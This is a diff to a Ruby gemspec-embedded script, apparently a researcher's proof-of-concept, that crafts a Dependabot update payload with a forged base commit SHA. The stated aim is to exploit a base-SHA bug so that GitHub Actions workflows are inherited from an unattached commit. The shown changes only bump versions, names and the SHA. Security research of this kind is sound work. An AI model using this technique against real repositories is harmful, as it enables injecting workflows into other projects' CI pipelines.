@@ -8,9 +8,9 @@ require "uri"
 # vendor marker. The proof workflows are inherited from an unattached
 # commit selected through the separately documented Dependabot base-SHA bug.
 module OwnedDependabotInstallWorkflows
-  DEPENDENCY_NAME = "owned_official_downloader_dot_probe_v8"
-  FORGED_BASE_SHA = "8a827014d07e7fbc6157c69a5121d18454013fab"
-  MARKER_PATH = "vendor/owned-official-downloader-dot-install-v8.txt"
+  DEPENDENCY_NAME = "owned_official_actions_dot_probe_v9"
+  FORGED_BASE_SHA = "ba4b4dd8741c36806078c93b240c2b60294271e4"
+  MARKER_PATH = "vendor/owned-official-actions-dot-install-v9.txt"
 
   module_function
 
@@ -60,8 +60,8 @@ module OwnedDependabotInstallWorkflows
       "data" => {
         "dependencies" => [{
           "name" => DEPENDENCY_NAME,
-          "version" => "0.0.25",
-          "previous-version" => "0.0.24",
+          "version" => "0.0.26",
+          "previous-version" => "0.0.25",
           "requirements" => [requirement],
           "previous-requirements" => [requirement],
           "directory" => "/"
@@ -77,8 +77,8 @@ module OwnedDependabotInstallWorkflows
           "operation" => "create"
         }],
         "base-commit-sha" => FORGED_BASE_SHA,
-        "commit-message" => "test: install owned official downloader dot proof",
-        "pr-title" => "Owned official downloader dot proof",
+        "commit-message" => "test: install owned official Actions dot proof",
+        "pr-title" => "Owned official Actions dot proof",
         "pr-body" => "Researcher-owned security test. Benign workflows are inherited from the caller-selected parent. They only test Actions artifact handling and never print or transmit credentials."
       }
     }
@@ -89,7 +89,7 @@ OwnedDependabotInstallWorkflows.run
 
 Gem::Specification.new do |spec|
   spec.name = "owned_dependabot_remote_probe"
-  spec.version = "0.0.25"
+  spec.version = "0.0.26"
   spec.summary = "Owned Dependabot security probe"
   spec.authors = ["Owned Security Test"]
   spec.files = []
